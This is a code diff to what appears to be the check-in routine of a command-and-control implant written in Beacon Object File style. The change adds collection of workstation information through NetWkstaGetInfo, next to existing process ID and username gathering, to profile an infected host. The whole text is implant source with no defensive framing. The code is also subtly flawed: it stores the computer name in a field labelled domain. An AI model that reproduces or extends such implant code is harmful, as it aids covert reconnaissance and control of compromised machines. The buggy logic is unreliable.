@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <lm.h>
 #include "../headers/celebi.h"
 
 WINBASEAPI DWORD KERNEL32$GetCurrentProcessId();
@@ -7,6 +8,8 @@ WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, 
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
 
 WINBASEAPI BOOL ADVAPI32$GetUserNameA(LPCSTR lpBuffer, LPDWORD pcbBuffer);
+WINBASEAPI NET_API_STATUS WINAPI NETAPI32$NetWkstaGetInfo(LMSTR, DWORD, LPBYTE*);
+WINBASEAPI NET_API_STATUS WINAPI NETAPI32$NetApiBufferFree(LPVOID);
 
 void go(CheckinRequest *req) {
 	BOOL result;
@@ -29,4 +32,17 @@ void go(CheckinRequest *req) {
 	} else {
 		KERNEL32$VirtualFree(hostname, 0, MEM_RELEASE);
 	}
+	
+	LPWKSTA_INFO_100 workstationInfo = { 0 };
+	NET_API_STATUS status = NETAPI32$NetWkstaGetInfo(NULL, 100, (LPBYTE *) &workstationInfo);
+	if (status == NERR_Success) {
+		req->domain = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+		for (int i = 0; i < 256; i++) {
+			req->domain[i] = workstationInfo->wki100_computername[i];
+			if (req->domain[i] == 0) {
+				break;
+			}
+		}
+	}
+	NETAPI32$NetApiBufferFree(workstationInfo);
 }
